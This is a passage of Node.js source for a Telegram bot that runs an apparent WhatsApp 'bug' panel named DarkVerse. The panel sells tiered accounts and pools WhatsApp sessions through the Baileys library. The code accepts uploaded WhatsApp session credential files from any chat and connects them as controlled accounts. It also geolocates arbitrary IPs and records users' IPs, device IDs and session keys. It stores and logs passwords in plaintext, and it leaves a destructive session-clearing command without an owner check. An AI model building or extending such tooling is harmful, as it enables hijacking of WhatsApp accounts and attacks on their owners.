    `🎁 *Akun Gratis Dibuat (Publik)*\nUsername: ${finalUsername}\nPassword: ${newPassword}\nExpired: ${expiredDate}`,
    { parse_mode: "Markdown" }
  );

  console.log("[✅ FREE CREATE] Akun gratis berhasil dibuat:", finalUsername);
  
  const logLine = `${new Date().toISOString()} | PUBLIC | Created | ${finalUsername} | ${newPassword} | 7 days\n`;
  try {
    fs.appendFileSync('logFreeAccount.txt', logLine);
  } catch (e) {
    console.log("Error writing free account log:", e);
  }

  return res.json({ 
    valid: true, 
    created: true, 
    message: "Free account created successfully",
    user: {
      username: finalUsername,
      password: newPassword,
      expiredDate: expiredDate,
      role: "member",
      pairId: null
    }
  });
});

let freeAccountLimits = {};

app.get("/checkFreeLimit", (req, res) => {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  
  if (freeAccountLimits[clientIp] && (now - freeAccountLimits[clientIp].lastReset) > oneDay) {
    freeAccountLimits[clientIp] = { count: 0, lastReset: now };
  }
  
  if (!freeAccountLimits[clientIp]) {
    freeAccountLimits[clientIp] = { count: 0, lastReset: now };
  }
  
  const remaining = Math.max(0, 3 - freeAccountLimits[clientIp].count);
  
  res.json({
    valid: true,
    used: freeAccountLimits[clientIp].count,
    remaining: remaining,
    limit: 3,
    resetIn: freeAccountLimits[clientIp].count >= 3 ? 
      Math.ceil((oneDay - (now - freeAccountLimits[clientIp].lastReset)) / (60 * 60 * 1000)) + " jam" : 
      "0 jam"
  });
});

app.get("/getTotalUsers", (req, res) => {
  try {
    const dbPath = path.join(__dirname, 'database.json');
    const dbData = fs.readFileSync(dbPath, 'utf8');
    const users = JSON.parse(dbData);
    
    const totalUsers = users.length;
    
    return res.json({
      success: true,
      message: "Total users retrieved successfully",
      totalUsers: totalUsers,
      timestamp: Date.now()
    });
  } catch (error) {
    console.error("Error reading database.json:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to read database",
      totalUsers: 0,
      error: error.message
    });
  }
});

let bugWa;

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "aan";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'aan' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "aan";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('aan', owner, number); 

  if (!fs.existsSync('aan')) fs.mkdirSync('aan');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('aan', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds);
    fs.writeFileSync(destCreds, data);
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  const subfolders = fs.readdirSync('aan')
    .map(name => path.join('aan', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside aan`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'aan');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  
  await refreshUserSessions();
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\n\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\n\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        // ═══ create_member = member = NO pairId ═══
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        // ═══ create_custom: pairId hanya kalau role privileged ═══
        const newUser = { username, password, role, expiredDate: expired.toISOString().split("T")[0] };
        if (isRatPrivileged(role)) {
          newUser.pairId = genPairId();
        }
        db.push(newUser);
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*\n\n` +
      `*Server Online* [${new Date().toLocaleTimeString()}]\n` +
      `*Ping:* ~${ping}ms\n` +
      `*RAM:* ${ramUsage.toFixed(2)} MB\n` +
      `*CPU:* ${cpuLoad.toFixed(2)}\n` +
      `*Uptime:* ${uptime}\n` +
      `*Total Database:* ${dbLength}\n` +
      `*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `*IP Tracker Result*\n\n` +
      `IP: ${data.ip || ip}\n` +
      `Kota: ${data.city || "-"}\n` +
      `Negara: ${data.country_name || "-"} (${data.country_code || "?"})\n` +
      `Zona Waktu: ${data.timezone || "-"}\n` +
      `ISP: ${data.org || "-"}\n` +
      `Latitude: ${data.latitude || "-"}\n` +
      `Longitude: ${data.longitude || "-"}\n\n` +
      `Database: ${data.asn || "-"}`;

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}

function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `*INFORMASI AKUN*\n\n` +
      `*Username:* ${dbUser?.username || keyUser?.username || username}\n` +
      `*Role:* ${role}\n` +
      `*Expired Date:* ${expired}\n` +
      `*Terakhir Kirim:* ${lastSend}\n` +
      `*Terakhir Login:* ${lastLogin}\n` +
      `*IP Address:* ${ip}\n` +
      `*Android ID:* ${android}\n` +
      `*Session Key:* \`${session}\``;

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    const info = `*Bot Statistics*\n\n` +
      `*Status:* Online\n` +
      `*Uptime:* ${getUptime()}\n\n` +
      `*User Data*\n` +
      `• Total User: ${totalUser}\n` +
      `• Owner: ${owners}\n` +
      `• Reseller: ${resellers}\n` +
      `• VIP: ${vips}\n` +
      `• Member: ${members}\n\n` +
      `*WhatsApp Session*\n` +
      `• Messenger: ${connectedMess}\n` +
      `• Business: ${connectedBiz}\n` +
      `• Active Numbers: ${connectedNumbers}\n\n` +
      `*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`;

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

bot.onText(/\/clearsession/, async (msg) => {

  const baseDir = path.join(__dirname, "aan");

  let deletedSession = 0;
  let deletedUser = 0;

  const users = fs.readdirSync(baseDir);

  for (const user of users) {

    const userFolder = path.join(baseDir, user);

    if (!fs.lstatSync(userFolder).isDirectory()) continue;

    const sessions = fs.readdirSync(userFolder);

    for (const session of sessions) {

      const sessionPath = path.join(userFolder, session);

      if (!activeConnections[session]) {

        fs.rmSync(sessionPath, { recursive: true, force: true });
        deletedSession++;

      }

    }

    const remaining = fs.readdirSync(userFolder);

    if (remaining.length === 0) {

      fs.rmSync(userFolder, { recursive: true, force: true });
      deletedUser++;

    }

  }

  bot.sendMessage(msg.chat.id,
`🧹 CLEAR SESSION SELESAI

Session mati dihapus : ${deletedSession}
User folder dihapus  : ${deletedUser}`
);

});

bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000);

  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

bot.onText(/^\/?cratevip(?:\s+(\d+)\s*,\s*(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  
  if (!match[1] || !match[2]) {
    return bot.sendMessage(chatId, 
      "📝 *Cara Penggunaan:*\n" +
      "`/cratevip [jumlah_hari],[nama1],[nama2],[nama3]`\n\n" +
      "*Contoh:*\n" +
      "`/cratevip 99999,ardi,ardu,ardo`\n\n" +
      "📌 *Note:*\n" +
      "• Pisahkan dengan koma (`,`)\n" +
      "• Jumlah hari akan di-set ke 99999\n" +
      "• Bisa membuat banyak akun sekaligus",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const days = parseInt(match[1]);
    const usernamesRaw = match[2];
    
    if (isNaN(days) || days <= 0) {
      return bot.sendMessage(chatId, "❌ Jumlah hari tidak valid. Gunakan angka positif.");
    }

    const usernames = usernamesRaw.split(',').map(u => u.trim()).filter(u => u.length > 0);
    
    if (usernames.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada username yang dimasukkan.");
    }

    if (usernames.length > 10) {
      return bot.sendMessage(chatId, "❌ Maksimal 10 akun dalam satu perintah.");
    }

    const db = loadDatabase();
    const results = {
      success: [],
      failed: []
    };

    for (const username of usernames) {
      if (!username || username.length < 3) {
        results.failed.push({ username, reason: "Username terlalu pendek (min 3 karakter)" });
        continue;
      }

